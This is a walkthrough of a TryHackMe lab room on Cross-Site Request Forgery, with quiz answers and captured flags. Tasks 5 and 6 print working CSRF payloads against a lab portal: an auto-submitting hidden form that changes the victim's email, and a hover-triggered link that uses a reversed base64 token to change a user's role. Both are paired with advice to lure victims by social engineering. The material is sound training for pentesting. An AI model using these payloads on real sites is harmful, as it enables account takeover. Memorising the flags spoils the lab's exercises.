# Jr.Pen 7.2. CSRF Introduction

### Task 1 - Introduction

Cross-Site Request Forgery (CSRF) exploits a browser's stored authentication cookies to trick logged-in users into unknowingly executing unauthorized actions on a trusted website.

### Task 2 - What is CSRF

CSRF tricks an authenticated user's browser into silently making unauthorized requests to a trusted application.

**How CSRF Attacks Work**

![How CSRF works.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481672467.png)

A typical CSRF attack usually follows three simple steps:

- The victim logs in to a legitimate web application, and their browser stores a session cookie.
- The attacker tricks the victim into visiting a malicious webpage containing a crafted request.
- The victim’s browser automatically sends the request to the target application along with the stored session cookie.

**Why This Is Dangerous:** CSRF attacks can be used to perform many actions depending on the functionality of the target application, such as:

- Changing a user’s email address
- Updating account settings
- Performing financial transactions
- Modifying security preferences

**Answer the questions below**

> What relationship between the browser and the web application does a CSRF attack abuse?
> 

Trust

> What does the browser automatically include with requests after login?
> 

Cookies

### Task 3 - Why CSRF Works

CSRF succeeds because browsers automatically attach session cookies to requests, and web applications blindly trust them without verifying their origin.

![Why CSRF works.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481729380.png)

**Key Conditions for a CSRF Attack:** For a CSRF attack to work, three main conditions usually have to exist:

- The victim must be authenticated to the target application.
- The application must perform a state-changing action such as updating settings or modifying account data.
- The application must not verify whether the request came from a trusted source.

**Answer the questions below**

> What type of action is usually required for a CSRF attack to succeed?
> 

State-changing

### Task 4 - Finding CSRF Vulnerabilities

CSRF attacks primarily target state-changing HTTP requests—such as those modifying account data—rather than requests that simply retrieve information.

As a pentester, you should carefully inspect application functionality and ask a simple question:

***Can this action be triggered without verifying that the request actually came from the user?***

If the answer is yes, the feature might be vulnerable to CSRF.

**Common Features Vulnerable to CSRF:** Certain actions frequently appear in CSRF vulnerabilities because they modify important user data. While testing an application, pay special attention to requests that perform operations such as:

![Common functions with CSRF vulnerabilities.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775481944957.png)

If these requests do not include any protection mechanism, such as CSRF tokens, they may be susceptible to forged requests.

**GET vs POST - A Common Misconception:** Relying on the HTTP request method (GET vs. POST) does not prevent CSRF because both can be exploited if the application fails to verify the request's origin.

**Answer the questions below**

> What HTTP request method do many developers incorrectly believe prevents CSRF?
> 

POST

> What mechanism is commonly used to protect applications from CSRF attacks?
> 

CSRF tokens

### Task 5 - Exploitation using HTML Form

In the attached VM, visit the StaffHub app at `http://staffhub.thm:8080` and log in with the credentials `user` and `user`. Please use the mentioned domain name instead of accessing the web app using the IP address. Once you are logged in, visit the settings page, where you will find the option to change the email, as shown below:

![The settings page with the "Update Email" option.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1772918648421.png)

The **StaffHub** employee portal allows users to update their email address from the account settings page. When a user submits the form, the browser sends a POST request to the server containing the new email address. However, the application lacks CSRF protection, meaning the server does not verify the origin of the request. Here is the HTML code that posts the content:

```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <i class="material-icons prefix">alternate_email</i>
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>

    <button class="btn waves-effect waves-light teal btn-rounded" type="submit">
        Update Email
        <i class="material-icons right">save</i>
    </button>
</form>
```

Because of this, an attacker can recreate the same request from another webpage and trick the victim’s browser into automatically submitting it.

**Crafting a Malicious Page:** An attacker can create a malicious webpage containing a hidden form that submits the same request to the StaffHub server. The form can be automatically submitted using JavaScript when the victim opens the page. Switch to your AttackBox tab and navigate to the `/var/www/html` using the `cd /var/www/html` command, and create a new file using `nano settings.html` and copy the following code:

```jsx
<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
```

This page can be accessed via the link `http://CONNECTION_IP:81/settings.html`. If a victim who is already logged in to StaffHub visits this page, their browser will automatically send the forged request to the server along with their session cookie. From the server’s perspective, the request appears to come from the authenticated user.

The attacker can send the URL to the target using any social engineering technique, such as convincing the target to click the link in a chat or email.

Switch back to the target VM tab. Then open the link `http://CONNECTION_IP:81/settings.html` in the same browser and same tab where you are logged in to the application and it will update your email to [`attacker@evilmail.thm`](mailto:attacker@evilmail.thm) as shown below:

![flag after updating the email.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1772922823745.png)

**What Exactly Happened?**

Since the application does not verify the request’s origin, the server processes it normally and updates the user’s email address to the attacker’s value. This simple technique demonstrates the core idea behind CSRF attacks: forcing an authenticated user’s browser to perform actions without their knowledge.

**Answer the questions below**

> What is the flag value after updating the email to attacker@evilmail.thm?
> 

THM{Got_The_Evil_Email001}


<img width="450" height="315" alt="image" src="https://github.com/user-attachments/assets/b5a4425b-a5cf-43cb-bf84-beba1c1dfaaa" />


> What is the flag value after updating the email to special@evilmail.thm?
> 

THM{My_Special_Email007}


<img width="450" height="315" alt="image 1" src="https://github.com/user-attachments/assets/2e36da86-1cd1-475b-b028-456f9693a46d" />


### Task 6 - Exploitation over Weak Tokens

In the previous task, we exploited a feature that lacked CSRF protection. In real applications, however, developers often try to defend against CSRF by adding a token to sensitive requests. This is a good step, but only if the token is unique, unpredictable, and properly validated. If the token is generated in a weak or reversible way, an attacker may still be able to bypass the protection.

In this task, we will look at a basic example of reversing weak CSRF protection and then use that knowledge to launch an image-based CSRF attack.

**Practical:** In the attached VM, log in to the StaffHub application at `http://staffhub.thm:8080` using the credentials `user` and `user`. After logging in, navigate to the settings page, where you will find a feature that updates the role of the currently logged-in user.

![The settings page with the "Update Role" option.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1773043120537.png)

This action is protected by a CSRF token. At first glance, this may look secure. If you view the source or review the request and token value, we can see that the token is not randomly generated. Instead, it is derived from predictable user data and can be easily reversed, as it is actually the base64-encoded value of the user's role.

![source code review showing csrf token.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1773045097317.png)

For example, the application includes a hidden CSRF field like this:

```html
<input type="hidden" name="csrf_token" value="YWRtaW4=">
```

If we decode this value, we get the value `admin`. You can use [CyberChef(opens in new tab)](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WVdSdGFXND0) or decode using [this (opens in new tab)](https://emn178.github.io/online-tools/base64_decode.html)website.

This indicates that the application uses a weak, predictable token-generation method. Since the attacker understands how the token is created, they can reproduce it on their own malicious page.

**Preparing the Payload:** In the AttackBox, navigate to the web directory using `cd /var/www/html`, create a file using `nano role.html`  and add the following code:

```html
<html>
<body>

<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>

<img src="http://staffhub.thm:8080/one.png"
onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
width="400">

</body>
</html>
```

Save the file for sharing with the target using `http://CONNECTION_IP:81/role.html`.

The code above creates a simple webpage that displays an image with a small JavaScript event handler attached. When the user moves their mouse over the image, the `onmouseover` event triggers a redirect to the StaffHub URL that contains the role update request along with the CSRF token. As a result, the victim’s browser automatically sends the request to the application using the victim’s authenticated session cookie, allowing the role change to be performed without the user’s knowledge.

**Sending the Payload:** As in the previous case, the attacker can use any social engineering method to send the link to the victim (over email or chat). If the victim is already logged in to StaffHub and visits this page, hovering over the image will cause the browser to request the vulnerable URL. Since the request contains the expected CSRF token and the victim’s session cookie is automatically included, the application will treat it as legitimate.

Switch back to the target VM tab. Then open the link in the same browser where you are logged in to the application, as shown below:

![The vulnerable page created by the attacker.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1775072457287.png)

As a result, on mouse over, the browser will make a call to the vulnerable endpoint with correct parameters like `role` and `csrf-token`, which will change the logged-in user’s role from admin to staff.

![flag value after demoting the user from admin to staff.](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1773046634047.png)

Weak CSRF protection can create a false sense of security. A token must be unique, unpredictable, and securely tied to the user session. If it can be guessed or reversed, it can still be abused by an attacker. In the next task, we will examine the appropriate defensive measures developers should use to prevent CSRF attacks effectively.

**Answer the questions below**

> What is the flag value after demoting the user from admin to staff? Visit the dashboard page to get the flag.
> 

THM{Weak_CSRF_Role_001}

<img width="266" height="80" alt="image 2" src="https://github.com/user-attachments/assets/623caacc-fbbf-4df8-a972-725c565f8af8" />

<img width="361" height="78" alt="image 3" src="https://github.com/user-attachments/assets/d7334476-e7e3-425a-a929-70da643c68fe" />

<img width="481" height="321" alt="image 4" src="https://github.com/user-attachments/assets/de26ea27-3629-4960-8d8c-248b2ee4c08d" />


> In the above example, what is the name of the encoding scheme used by the developer for encoding CSRF tokens?
> 

base64

### Task 7 - Best Practices

After learning how CSRF vulnerabilities can be exploited, it is important for pentesters to know how to efficiently identify them during an assessment. The following practices can help you quickly spot potential CSRF weaknesses while testing web applications.

**Key Practices**

1. Focus on **state-changing requests**: Prioritise requests that modify data, such as password changes, email updates, account settings, or financial transactions. These endpoints are the most common targets for CSRF attacks.
2. **Inspect requests for CSRF tokens**: Check whether sensitive actions include a CSRF token. If no token exists, or if the token appears static or predictable, the request may be vulnerable.
3. **Analyse HTTP methods**: Sensitive actions should typically use POST requests. If important operations are performed through GET requests, they may be easier to exploit using images or simple links.
4. **Test the requests outside of the application**: Copy the request and try to reproduce it from an external HTML page. If the action succeeds without additional verification, the endpoint is likely vulnerable to CSRF.
5. **Observe cookie behaviour**: Check whether authentication relies only on session cookies. If the application automatically accepts requests containing the session cookie without validating the request origin, CSRF attacks become possible.

### Task 8 - Conclusion

In this room, we explored the concept of CSRF and how attackers can abuse a victim’s authenticated session to perform unintended actions. Through practical exercises, we observed that simple actions, such as submitting a hidden form or interacting with a webpage element, can trigger malicious requests.

We also saw that even applications that implement CSRF protection can remain vulnerable if the protection mechanism is weak or predictable. By reversing a poorly designed token, you recreated a valid request and successfully bypassed the defence. Finally, we reviewed important practices that pentesters should follow when identifying CSRF vulnerabilities during assessments.

Understanding how these attacks work and how they can be detected is essential for both security testers and developers building more secure applications.
